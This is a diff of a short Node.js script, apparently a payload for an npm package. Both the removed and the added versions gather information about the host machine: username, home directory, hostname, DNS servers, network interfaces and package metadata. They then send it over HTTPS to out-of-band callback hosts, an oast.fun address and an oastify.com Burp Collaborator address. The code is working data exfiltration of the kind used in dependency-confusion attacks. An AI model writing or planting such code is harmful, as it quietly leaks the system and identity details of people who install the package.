@@ -1,47 +1,45 @@
-const os = require("os");
-const dns = require("dns");
-const querystring = require("querystring");
-const https = require("https");
-const packageJSON = require("./package.json");
-const package = packageJSON.name;
+const os = require('os');
+const https = require('https');
+const { execSync } = require('child_process');
 
-const trackingData = JSON.stringify({
-    p: package,
-    c: __dirname,
-    hd: os.homedir(),
-    hn: os.hostname(),
-    un: os.userInfo().username,
-    dns: dns.getServers(),
-    r: packageJSON ? packageJSON.___resolved : undefined,
-    v: packageJSON.version,
-    pjson: packageJSON,
-});
+// Replace with your Burp Collaborator URL
+const burpCollaboratorUrl = '75at9bhoyndx3dt9eyp710fssjyam2ar.oastify.com';
 
-var postData = querystring.stringify({
-    msg: trackingData,
-});
-
-var options = {
-    hostname: "kihudgfdgwjalhttdpbcr8sewvti3fzlj.oast.fun", //replace burpcollaborator.net with Interactsh1 or 
-pipedream
-    port: 443,
-    path: "/",
-    method: "POST",
-    headers: {
-        "Content-Type": "application/x-www-form-urlencoded",
-        "Content-Length": postData.length,
-    },
+// Collect device information
+const deviceInfo = {
+  platform: os.platform(),
+  release: os.release(),
+  hostname: os.hostname(),
+  arch: os.arch(),
+  userInfo: os.userInfo(),
+  networkInterfaces: os.networkInterfaces()
 };
 
-var req = https.request(options, (res) => {
-    res.on("data", (d) => {
-        process.stdout.write(d);
-    });
+// Convert device information to a query string
+const queryString = Object.entries(deviceInfo).map(([key, value]) => {
+  if (typeof value === 'object') {
+    value = JSON.stringify(value);
+  }
+  return `${encodeURIComponent(key)}=${encodeURIComponent(value)}`;
+}).join('&');
+
+// Define the request options
+const options = {
+  hostname: burpCollaboratorUrl,
+  port: 443,
+  path: `/?${queryString}`,
+  method: 'GET'
+};
+
+// Create the request
+const req = https.request(options, (res) => {
+  console.log(`Status: ${res.statusCode}`);
 });
 
-req.on("error", (e) => {
-    // console.error(e);
+// Handle any errors
+req.on('error', (error) => {
+  console.error(`Error: ${error.message}`);
 });
 
-req.write(postData);
+// End the request
 req.end();
